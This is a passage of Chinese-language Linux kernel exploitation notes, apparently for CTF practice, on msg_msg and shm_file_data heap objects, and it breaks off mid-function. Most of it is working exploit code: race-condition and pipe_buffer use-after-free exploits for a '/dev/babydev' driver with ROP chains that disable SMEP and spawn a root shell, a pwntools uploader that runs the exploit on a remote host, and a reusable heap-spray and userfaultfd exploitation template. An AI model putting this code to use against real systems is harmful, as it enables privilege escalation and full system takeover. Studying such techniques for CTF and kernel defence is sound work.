#include <sys/msg.h>

int msqid;
struct msgp{
  long type;
  char mtext[256];
};

if((msqid = msgget(IPC_PRIVATE,IPC_CREAT|0666)) == -1){
  perror("msgget");
  return 1;
}

struct msgp msgp1;
msgp1.type = 1;
strcpy(msgp1.mtext,"aaaaaaaaaaaaaaaaaaaaaaa");
if(msgsnd(msqid,&msgp1,sizeof(msgp1.mtext),0) == -1){
  perror("msgsnd");
  return 1;
}
```

msgsnd()函数对应的内核态调用过程如下图所示

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240118161320.png)

内核中调用 do_msgsnd() 函数，申请 struct msg_msg 结构体和用户态传递的msgp1.mtext共同一段内存空间(堆)（根据mtext大小的不同，从0x31~0x1000字节大小都有可能）
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240118161518.png)
这个图更加形象(结构体+用户数据)(在 alloc_msg() 函数中会申请三个堆消息分段存储)
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240118161850.png)



msgrcv()，用于将msgp1.mtext的内容从内核堆中读取到用户态

```c
char* recv_msg = malloc(0x1000);
int result;
result = msgrcv(msqid,recv_msg,0x1000,0,IPC_NOWAIT|MSG_NOERROR);
if (result<0)
{
    perror("msgrcv");
    exit(1);
}
////////////////第一种情况///////////////
// msgrcv()
// -----⬇------- 用户态传入的msgflg无MSG_COPY标志
// ksys_msgrcv()
//      ⬇
// do_msgrcv()
//  	⬇
// find_msg() -> do_msg_fill() -> free_msg()			
//				     ⬇
//               store_msg()
// find_msg()：定位正确的消息，后将消息从队列中unlink
// do_msg_fill() -> store_msg()：将数据从内核态拷贝到用户态
// free_msg()：释放消息

char* recv_msg = malloc(0x1000);
int result;
result = msgrcv(msqid,recv_msg,0x1000,0,IPC_NOWAIT|MSG_NOERROR|MSG_COPY);
if (result<0)
{
    perror("msgrcv");
    exit(1);
}
////////////////第二种情况///////////////
// msgrcv()
// -----⬇------- 用户态传入的msgflg有MSG_COPY标志（编译内核时需要开启CONFIG_CHECKPOINT_RESTORE选项）
// ksys_msgrcv()
//      ⬇
// do_msgrcv()
//  	⬇
// prepare_copy() -> find_msg() -> copy_msg() -> do_msg_fill() -> free_msg()			
//				                                      ⬇
//                                                store_msg()
// prepare_copy()：先申请一段内存空间，用于后面存放消息备份
// find_msg()：定位正确的消息，由于MSG_COPY标志的存在，将跳过消息队列的unlink操作（在漏洞利用时，有时会覆盖掉msg_msg的双链表指针，unlink操作会导致崩溃。在开启CONFIG_CHECKPOINT_RESTORE选项的内核中，有了MSG_COPY标志，就可以避免该崩溃）
// copy_msg()：将找到的消息拷贝到消息备份中。后续的操作都是针对消息备份，不会改变消息队列中原来的消息
// do_msg_fill() -> store_msg()：将消息备份中的数据从内核态拷贝到用户态
// free_msg()：释放消息备份
```




##### msg_msg+shm函数
```c

int g_msqid;
struct g_msgp{
  long type;
  char mtext[0xfe8];    // 0x1000-0x30+0x20-0x8 = 0xFE8
};

int msg_msgget(key_t key,int msgflg) 
{
    int msqid;
    if((msqid = msgget(key,msgflg)) == -1){              
        perror("msgget");
        exit(-1);
    }
    return msqid;
}

void msg_msgsnd(int msqid,void *msgp,size_t msgsz,int msgflg) 
{
    if(msgsnd(msqid,msgp,msgsz,msgflg) == -1){          
        perror("msgsnd");
        exit(-1);
    }
}

ssize_t msg_msgrcv(int msqid,void *msgp,size_t msgsz,long msgtyp,int msgflg) 
{
    ssize_t result;
    result = msgrcv(msqid,msgp,msgsz,msgtyp,msgflg);           
    if (result<0)
    {
        perror("msgrcv");
        exit(-1);
    }
    return result;
}

void msg_msgctl(int msqid,int cmd,struct msqid_ds *buf)         
{
    if ((msgctl(msqid,cmd,buf))==-1)                        // 删除队列 msg_msgctl(msqid,IPC_RMID,NULL);
    {
        perror("Msgctl");
        exit(-1);
    }
}

void create_shm_file_data()
{
    int shmid;
    if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) {
      perror("shmget");
      exit(0);
    }
    char *shmaddr = shmat(shmid, NULL, 0);
    if (shmaddr == (void*)-1) {
      perror("shmat");
      exit(0);
    }
}
```



##### shm_file_data(泄露地址结构体)

demo

```c
#include<sys/shm.h>
int shmid;
if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) {
  perror("shmget");
  return 1;
}
char *shmaddr = shmat(shmid, NULL, 0);
if (shmaddr == (void*)-1) {
  perror("shmat");
  return 1;
}
```

shmat()函数对应的内核态调用过程如下图所示
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240118160659.png)

内核中调用do_shmat，会申请[struct shm_file_data](https://elixir.bootlin.com/linux/v4.4.72/source/ipc/shm.c#L50)结构体，大小0x20

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240118160815.png)

ns和vm_ops两个指针均指向内核数据区，file指针指向堆区域，vm_ops指向的函数表

#### subprocess_info


```c
// exp.c
// gcc exp.c -static -masm=intel  -o exp -lpthread
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<errno.h>
#include<sys/socket.h>
#include<pthread.h>
#include<sys/ioctl.h>
#include<sys/mman.h>


int race_flag = 0;
static int fd1 = 0;
static int fd2 = 0;
__uint64_t target_buf[2];

__uint64_t xchg_esp_eax_ret = 0xffffffff8100008a;           // xchg esp, eax ; ret
__uint64_t pop_rax_ret = 0xffffffff8101c216;               // pop rax ; ret
__uint64_t mov_rsp_rax_ret = 0xffffffff818855cf;           // mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b
__uint64_t mov_cr4_rax_ret = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret
__uint64_t swapgs_ret = 0xffffffff81885588;             // swapgs; ret
__uint64_t iretq = 0xffffffff81884177;                  // iretq


__uint64_t commit_creds = 0xffffffff8106fed0;
__uint64_t prepare_kernel_cred = 0xffffffff81070260;
__uint64_t init_cred_addr = 0xffffffff81b79a60;

void get_root(){
    //char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    //(*cc)((*pkc)(0));
    (*cc)(init_cred_addr);
}

void get_shell(){
    system("/bin/sh");
}

size_t user_cs, user_rflags, user_sp, user_ss;
void save_status(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}


void race()
{
    target_buf[0] = xchg_esp_eax_ret;
    target_buf[1] = 0x11111111;
    __uint64_t fake_stack_addr = ((__uint64_t)xchg_esp_eax_ret & 0xffffffff);
    if(mmap((char*)(fake_stack_addr&(~0xfff)),0x2000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0) == MAP_FAILED){
        perror("mmap failed.");
    }
    __uint64_t* fake_stack_ptr = (__uint64_t*)fake_stack_addr;
    int index = 0;
    fake_stack_ptr[index++] = pop_rax_ret;
    fake_stack_ptr[index++] = 0x6f0;
    fake_stack_ptr[index++] = mov_cr4_rax_ret;
    fake_stack_ptr[index++] = 0xffff; 
    fake_stack_ptr[index++] = get_root;
    fake_stack_ptr[index++] = swapgs_ret;
    fake_stack_ptr[index++] = iretq;
    fake_stack_ptr[index++] = get_shell;
    fake_stack_ptr[index++] = user_cs;
    fake_stack_ptr[index++] = user_rflags;
    fake_stack_ptr[index++] = user_sp;
    fake_stack_ptr[index++] = user_ss;

    while(1)
    {
        write(fd2,target_buf,0x60+0x50);
        if(race_flag)
        {
            printf("child: detect race happen\n");
            break;
        }
    }
}


int main(){
    save_status();

    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    ioctl(fd1,0x10001,0x20);
    close(fd1);
    pthread_t th1;
    pthread_create(&th1,NULL,race,NULL);
    while(1){
        usleep(1);
        socket(22,AF_INET,0);                
        if(race_flag){
            printf("parent: detect race happen\n");
            break;
        }
    }
    close(fd2);

    return 0;
}
```



#### pipe_buffer


```c
// exp.c
// gcc exp.c -static -masm=intel  -o exp 
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<errno.h>
#include<sys/socket.h>
#include<pthread.h>
#include<sys/ioctl.h>
#include<sys/mman.h>


size_t fake_pipe_ops[5];
size_t fake_pipe_buffer[5];

__uint64_t xchg_esp_eax_ret = 0xffffffff8100008a;           // xchg esp, eax ; ret
__uint64_t pop_rax_ret = 0xffffffff8101c216;               // pop rax ; ret
__uint64_t mov_rsp_rax_ret = 0xffffffff818855cf;           // mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b
__uint64_t mov_cr4_rax_ret = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret
__uint64_t swapgs_ret = 0xffffffff81885588;             // swapgs; ret
__uint64_t iretq = 0xffffffff81884177;                  // iretq

__uint64_t pop_rsp_ret = 0xffffffff81010fd7;     // pop rsp ; ret


__uint64_t commit_creds = 0xffffffff8106fed0;
__uint64_t prepare_kernel_cred = 0xffffffff81070260;
__uint64_t init_cred_addr = 0xffffffff81b79a60;

void get_root(){
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
    // (*cc)(init_cred_addr);
}

void get_shell(){
    system("/bin/sh");
}

size_t user_cs, user_rflags, user_sp, user_ss;
void save_status(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}


int main(){
    save_status();
    size_t rop_chain[30] = {0};
    int index = 0;
    rop_chain[index++] = 0xffffffff8101c216;        // pop rax; ret;
    rop_chain[index++] = 0x6f0;
    rop_chain[index++] = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret 
    rop_chain[index++] = 0x0;
    rop_chain[index++] = (size_t)get_root;
    rop_chain[index++] = 0xffffffff81885588;        // swapgs; ret 
    rop_chain[index++] = 0xffffffff81884177;        // iretq; 
    rop_chain[index++] = (size_t)get_shell;
    rop_chain[index++] = user_cs;
    rop_chain[index++] = user_rflags;
    rop_chain[index++] = user_sp;
    rop_chain[index++] = user_ss;


    fake_pipe_buffer[0] = 0x01010101;
    fake_pipe_buffer[1] = 0x02020202;
    fake_pipe_buffer[2] = fake_pipe_ops;
    fake_pipe_buffer[3] = 0x03030303;

    fake_pipe_ops[0] = pop_rsp_ret;          // pop rsp; ret
    fake_pipe_ops[1] = rop_chain;          // rop_chain
    fake_pipe_ops[2] = mov_rsp_rax_ret;          // control rip - xchg rsp,rax; ret
    fake_pipe_ops[3] = 0x33333333;
    fake_pipe_ops[4] = 0x44444444;




    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    ioctl(fd1,0x10001,0x400);
    close(fd1);
    int pipe_fd[2];
    pipe(pipe_fd);
    write(fd2,fake_pipe_buffer,0x20);
    close(pipe_fd[0]);
    close(pipe_fd[1]);
    close(fd2);
    return 0;
}
```


### 非预期


/init权限；qemu启动参数-monitor未重定向到/dev/null

#### 内存空间 initrd 与 flag 搜索

```c
// Local Descriptor Table
struct ldt_struct {
    /*
     * Xen requires page-aligned LDTs with special permissions.  This is
     * needed to prevent us from installing evil descriptors such as
     * call gates.  On native, we could merge the ldt_struct and LDT
     * allocations, but it's not worth trying to optimize.
     */
    struct desc_struct    *entries;//指针指向一块描述符表的内存，
    unsigned int        nr_entries;

    /*
     * If PTI is in use, then the entries array is not mapped while we're
     * in user mode.  The whole array will be aliased at the addressed
     * given by ldt_slot_va(slot).  We use two slots so that we can allocate
     * and map, and enable a new LDT without invalidating the mapping
     * of an older, still-in-use LDT.
     *
     * slot will be -1 if this LDT doesn't have an alias mapping.
     */
    int            slot;
};
```

Linux 提供了一个 modify_ldt() 系统调用来操纵该结构体

initrd 是指在启动阶段被Linux内核调用的临时文件系统，文件系统中所有的内容都会被载入到内存当中






### 杂谈

```shell
# attack.sh
#!/bin/sh
gcc exp.c -static -masm=intel -g -o exp
cp exp core/exp
cd core
hen core.cpio
cd ..
./start.sh
```







```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os

context.arch = "amd64"
context.log_level = 'debug'
cmd = '$ '


def exploit(r):
    r.sendlineafter(cmd, 'stty -echo')
    os.system('gzip -c ./exp > ./exp.gz')
    r.sendlineafter(cmd, 'cat <<EOF > /tmp/exp.gz.b64')
    r.sendline((read('./exp.gz')).encode('base64'))
    r.sendline('EOF')
    r.sendlineafter(cmd, 'base64 -d /tmp/exp.gz.b64 > /tmp/exp.gz')
    r.sendlineafter(cmd, 'gunzip /tmp/exp.gz')
    r.sendlineafter(cmd, 'chmod +x /tmp/exp')
    r.sendlineafter(cmd, "/tmp/exp")
    r.interactive()

if (len(sys.argv) != 3):
    print("python exp.py ip port")
    exit(0)

p = remote(sys.argv[1],sys.argv[2])
exploit(p)
```



exp

板子

```c
# banzi.h
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <keyutils.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <linux/genetlink.h>
#include <linux/if_packet.h>
#include <linux/netlink.h>
#include <linux/openvswitch.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sched.h>
#include <stdint.h>
#include <sys/utsname.h>
// #define DEBUG 1
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"
#define ELEM_CNT(x) (sizeof(x) / sizeof(x[0]))
#define SYS_SETRESUID_OFFSET (0xd81d0)
#define PREFIX_BUF_LEN (16)
#define logd(fmt, ...) dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        write(sync_pipe[1], "F", 1);       \
        exit(1);                           \
    } while (0)

int sync_pipe[2];
#ifdef DEBUG
#define debug(...) printf(__VA_ARGS__)
#else
#define debug(...) do {} while (0)
#endif

#define HEAP_MASK 0xffff000000000000
#define KERNEL_MASK 0xffffffff00000000

#define PAGE_SIZE 4096
#define MAX_KEYS 199
#define N_STACK_PPS 30
#define POLLFD_PER_PAGE 510
#define POLL_LIST_SIZE 16
#define NFDS(size) (((size - POLL_LIST_SIZE) / sizeof(struct pollfd)) + N_STACK_PPS);
pthread_t poll_tid[0x1000];
size_t poll_threads;
pthread_mutex_t mutex;
uint64_t usr_cs, usr_ss, usr_rflags;
uint64_t proc_single_show;
uint64_t target_object;
uint64_t kernel_base;

int pipes[0x1000][2];
int seq_ops[0x10000];
int ptmx[0x1000];
int fds[0x1000];
int keys[0x1000];
int corrupted_key;
int n_keys;
int fd;
int s;


struct t_args
{
    int id;
    int nfds;
    int timer;
    bool suspend;
};


struct rcu_head
{
    void *next;
    void *func;
};


struct user_key_payload
{
    struct rcu_head rcu;
    unsigned short	datalen;
    char *data[];
};
void init_namespace(void);
void set_cpu_affinity(int cpu_n, pid_t pid);
void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv, unsigned int timeout);


int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv, int timeout);

int pagealloc_pad(int size, int count);

struct poll_list
{
    struct poll_list *next;
    int len;
    struct pollfd entries[];
};



bool is_kernel_pointer(uint64_t addr);


bool is_heap_pointer(uint64_t addr);


void __pause(char *msg);


void save_state();
int randint(int min, int max);
void assign_to_core(int core_id);
void assign_thread_to_core(int core_id);
void init_fd(int i);
void *alloc_poll_list(void *args);
void create_poll_thread(int id, size_t size, int timer, bool suspend);
void join_poll_threads(void);
int alloc_key(int id, char *buff, size_t size);
void free_key(int i);
void free_all_keys(bool skip_corrupted_key);
char *get_key(int i, size_t size);
void alloc_pipe_buff(int i);
void release_pipe_buff(int i);
void alloc_tty(int i);
void free_tty(int i);
void alloc_seq_ops(int i);
void free_seq_ops(int i);
int leak_kernel_pointer(int kid);
int leak_heap_pointer(int kid);
bool check_root();
// typedef struct
// {
//     int64_t idx;
//     uint64_t size;
//     char *buf;    
// }user_req_t;

// struct tpacket_req {
//     unsigned int    tp_block_size;
//     unsigned int    tp_block_nr;
//     unsigned int    tp_frame_size;
//     unsigned int    tp_frame_nr;
// };

// enum tpacket_versions {
//     TPACKET_V1,
//     TPACKET_V2,
//     TPACKET_V3,
// };
// #define PACKET_VERSION 10
// #define PACKET_TX_RING 13
#define ISO_SLAB_LIMIT 8
#define INITIAL_PAGE_SPRAY 500
typedef struct
{
    bool in_use;
    int idx[ISO_SLAB_LIMIT];
}full_page;

enum spray_cmd {
    ALLOC_PAGE,
    FREE_PAGE,
    EXIT_SPRAY,
};

// typedef struct
// {
//     enum spray_cmd cmd;
//     int32_t idx;
//     int32_t size;
//     int32_t n;
// }ipc_req_t;

int shmid[0x1000];
void *shmaddr[0x1000];

void alloc_shm(int i);
int rootfd[2];
int sprayfd_child[2];
int sprayfd_parent[2];
// int socketfds[INITIAL_PAGE_SPRAY];
// int alloc_pages_via_sock(uint32_t size, uint32_t n);

// void spray_comm_handler();

// void send_spray_cmd(enum spray_cmd cmd, int idx,int n);
// void unshare_setup(uid_t uid, gid_t gid);
void errExit(char *msg);
void registerUserfault(void *fault_page,void *handler);

int spray_sendmsg(char *buf,int size,int count);
void hexdump(unsigned char *buff, size_t size);
struct msg_msg {
  uint64_t m_list_next;
  uint64_t m_list_prev;
  uint64_t m_type;
  uint64_t m_ts;
  uint64_t next;
  uint64_t security;
};

struct msg_msgseg {
  uint64_t next;
};
struct {
  long mtype;
  char mtext[0x4000];
} msgbuf;
int msgqid[0x10000];
int add_msg(int msqid, const void *msgp, size_t msgsz);

int show_msg(int msqid, void *msgp,size_t msgsz,long msgtyp);

int free_msg(int msqid, void *msgp, size_t msgsz, long msgtyp);
int msg_get();
void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
                   uint64_t m_list_prev, uint64_t m_type,uint64_t m_ts, uint64_t next);
void build_msg(int num);
```



```c
# banzi.c
#include "banzi.h"

void init_namespace(void) {
    int fd;
    char buff[0x100];

    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) {
        die("unshare(CLONE_NEWUSER | CLONE_NEWNS): %m");
    }

    if (unshare(CLONE_NEWNET)) {
        die("unshare(CLONE_NEWNET): %m");
    }

    fd = open("/proc/self/setgroups", O_WRONLY);
    snprintf(buff, sizeof(buff), "deny");
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", uid);
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", gid);
    write(fd, buff, strlen(buff));
    close(fd);
}

void set_cpu_affinity(int cpu_n, pid_t pid) {
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu_n, &set);

    if (sched_setaffinity(pid, sizeof(set), &set) < 0) {
        die("sched_setaffinity: %m");
    }
}

void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv, unsigned int timeout) {
    int v = TPACKET_V3;
    int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
    if (rv < 0) {
        die("setsockopt(PACKET_VERSION): %m");
    }

    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = block_size;
    req.tp_frame_size = frame_size;
    req.tp_block_nr = block_nr;
    req.tp_frame_nr = (block_size * block_nr) / frame_size;
    req.tp_retire_blk_tov = timeout;
    req.tp_sizeof_priv = sizeof_priv;
    req.tp_feature_req_word = 0;

    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    if (rv < 0) {
        die("setsockopt(PACKET_RX_RING): %m");
    }
}

int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0) {
        die("socket(AF_PACKET): %m");
    }

    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
                               sizeof_priv, timeout);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = PF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_hatype = 0;
    sa.sll_pkttype = 0;
    sa.sll_halen = 0;

    int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
    if (rv < 0) {
        die("bind(AF_PACKET): %m");
    }

    return s;
}

int pagealloc_pad(int size, int count) {
    return packet_socket_setup(size, 2048, count, 0, 100);
}

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
int add_msg(int msqid, const void *msgp, size_t msgsz) {
	if (msgsnd(msqid, msgp, msgsz, 0) < 0) {
		perror("[-] msgsnd");
    	return -1;
    }
    return 0;
}
void alloc_shm(int i) {
    shmid[i] = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0600);

    if (shmid[i] < 0) {
        perror("[X] shmget fail");
        exit(1);
    }

    shmaddr[i] = (void *)shmat(shmid[i], NULL, SHM_RDONLY);

    if (shmaddr[i] < 0) {
        perror("[X] shmat");
        exit(1);
    }
}
int show_msg(int msqid, void *msgp,size_t msgsz,long msgtyp) {
    if (msgrcv(msqid, msgp, msgsz, msgtyp, MSG_COPY | IPC_NOWAIT) < 0) {
        perror("[-] msgrcv");
        return -1;
    }
    return 0;
}

int free_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
    if (msgrcv(msqid, msgp, msgsz, msgtyp, 0) < 0) {
        perror("[-] msgrcv");
        return -1;
    }
    return 0;
}
int msg_get(){
    int pid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if(pid < 0){
        perror("msgget");
        return -1;
    }
    return pid;
}
void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
                   uint64_t m_list_prev, uint64_t m_type,uint64_t m_ts, uint64_t next) {
  msg->m_list_next = m_list_next;
  msg->m_list_prev = m_list_prev;
  msg->m_type = m_type;
  msg->m_ts = m_ts;
  msg->next = next;
  msg->security = 0;
}
void build_msg(int num){
	for(int i = 0;i < num;i++){
		msgqid[i] = msg_get();
	}
}
int spray_sendmsg(char *buf,int size,int count){
    // char buf[size];
    struct msghdr msgh = {0};
    struct sockaddr_in addr = {0};
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(6666);
 
    // filled with 0x61 'a'
    // memset(buf,'\x00',sizeof(buf));
    // *(uint64_t*)(buf + 8*2) = 0xfff0;
    // *(uint64_t*)(buf + 8*3) = 0xdeadbeef;
    // set user space buf(msg header)
    msgh.msg_control = buf;
    msgh.msg_controllen = size;
    msgh.msg_name = (caddr_t)&addr;
    msgh.msg_namelen = sizeof(addr);
    for(int i = 0;i < count;i++){
      sendmsg(sockfd, &msgh, 0);
    }
}
void registerUserfault(void *fault_page,void *handler)
{
   pthread_t thr;
   struct uffdio_api ua;
   struct uffdio_register ur;
   uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
   ua.api = UFFD_API;
   ua.features    = 0;
   if (ioctl(uffd, UFFDIO_API, &ua) == -1)
      errExit("[-] ioctl-UFFDIO_API");
 
   ur.range.start = (unsigned long)fault_page;
   ur.range.len   = PAGE_SIZE;
   ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
   if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
      errExit("[-] ioctl-UFFDIO_REGISTER");
   int s = pthread_create(&thr, NULL,handler, (void*)uffd);
   if (s!=0)
      errExit("[-] pthread_create");
}
void errExit(char *msg) {
   puts(msg);
   _exit(-1);
}
// int alloc_pages_via_sock(uint32_t size, uint32_t n)
// {
//     struct tpacket_req req;
//     int32_t socketfd, version;

//     socketfd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
//     if (socketfd < 0)
//     {
//         perror("bad socket");
//         exit(-1);
//     }

//     version = TPACKET_V1;

//     if (setsockopt(socketfd, SOL_PACKET, PACKET_VERSION, &version, sizeof(version)) < 0)
//     {
//         perror("setsockopt PACKET_VERSION failed");
//         exit(-1);
//     }

//     assert(size % 4096 == 0);

//     memset(&req, 0, sizeof(req));

//     req.tp_block_size = size;
//     req.tp_block_nr = n;
//     req.tp_frame_size = 4096;
//     req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

//     if (setsockopt(socketfd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0)
//     {
//         perror("setsockopt PACKET_TX_RING failed");
//         exit(-1);
//     }

//     return socketfd;
// }

// void spray_comm_handler()
// {
//     ipc_req_t req;
//     int32_t result;

//     do {
//         read(sprayfd_child[0], &req, sizeof(req));
//         assert(req.idx < INITIAL_PAGE_SPRAY);
//         if (req.cmd == ALLOC_PAGE)
//         {
//             socketfds[req.idx] = alloc_pages_via_sock(4096, req.n);
//             printf("%llx\n",socketfds[0]);
//         }
//         else if (req.cmd == FREE_PAGE)
//         {
//             close(socketfds[req.idx]);
//         }
//         result = req.idx;
//         write(sprayfd_parent[1], &result, sizeof(result));
//     } while(req.cmd != EXIT_SPRAY);

// }

// void send_spray_cmd(enum spray_cmd cmd, int idx,int n)
// {
//     ipc_req_t req;
//     int32_t result;

//     req.cmd = cmd;
//     req.idx = idx;
//     req.n = n;
//     write(sprayfd_child[1], &req, sizeof(req));
//     read(sprayfd_parent[0], &result, sizeof(result));
//     assert(result == idx);
// }
// void unshare_setup(uid_t uid, gid_t gid)
// {
//     int temp;
//     char edit[0x100];
//     unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);
//     temp = open("/proc/self/setgroups", O_WRONLY);
//     write(temp, "deny", strlen("deny"));
//     close(temp);
//     temp = open("/proc/self/uid_map", O_WRONLY);
//     snprintf(edit, sizeof(edit), "0 %d 1", uid);
//     write(temp, edit, strlen(edit));
//     close(temp);
//     temp = open("/proc/self/gid_map", O_WRONLY);
//     snprintf(edit, sizeof(edit), "0 %d 1", gid);
//     write(temp, edit, strlen(edit));
//     close(temp);
//     return;
// }
void win(void)
{
    if (check_root())
    {
        puts("[+] We are Ro0ot!");
        char *args[] = { "/bin/bash", "-i", NULL };
        execve(args[0], args, NULL);
    }
}
bool is_kernel_pointer(uint64_t addr)
{
    return ((addr & KERNEL_MASK) == KERNEL_MASK) ? true : false;
}


bool is_heap_pointer(uint64_t addr)
{
    return (((addr & HEAP_MASK) == HEAP_MASK) && !is_kernel_pointer(addr)) ? true : false;
}


void __pause(char *msg)
{
    printf("[-] Paused - %s\n", msg);
    getchar();
}


void save_state()
{
    __asm__ __volatile__(
        "movq %0, cs;"
        "movq %1, ss;"
        "pushfq;"
        "popq %2;"
        : "=r" (usr_cs), "=r" (usr_ss), "=r" (usr_rflags) : : "memory" );
}


int randint(int min, int max)
{
    return min + (rand() % (max - min));
}


void assign_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0)
    {
        perror("[X] sched_setaffinity()");
        exit(1);
    }
}

void hexdump(unsigned char *buff, size_t size) {
    int i, j;

    for (i = 0; i < size / 8; i++) {
        if ((i % 2) == 0) {
            if (i != 0) printf("  \n");

            printf("  %04x  ", i * 8);
        }

        printf("0x%016lx", ((uint64_t *)(buff))[i]);
        printf("    ");
    }

    putchar('\n');
}

void assign_thread_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0)
    {
        perror("[X] assign_thread_to_core_range()");
        exit(1);
    }
}


void init_fd(int i)
{
    fds[i] = open("/etc/passwd", O_RDONLY);

    if (fds[i] < 1)
    {
        perror("[X] init_fd()");
        exit(1);
    }
}


void *alloc_poll_list(void *args)
{
    struct pollfd *pfds;
    int nfds, timer, id;
    bool suspend;

    id    = ((struct t_args *)args)->id;
    nfds  = ((struct t_args *)args)->nfds;
    timer = ((struct t_args *)args)->timer;
    suspend = ((struct t_args *)args)->suspend;

    pfds = calloc(nfds, sizeof(struct pollfd));

    for (int i = 0; i < nfds; i++)
    {
        pfds[i].fd = fds[0];
        pfds[i].events = POLLERR;
    }

    assign_thread_to_core(0);

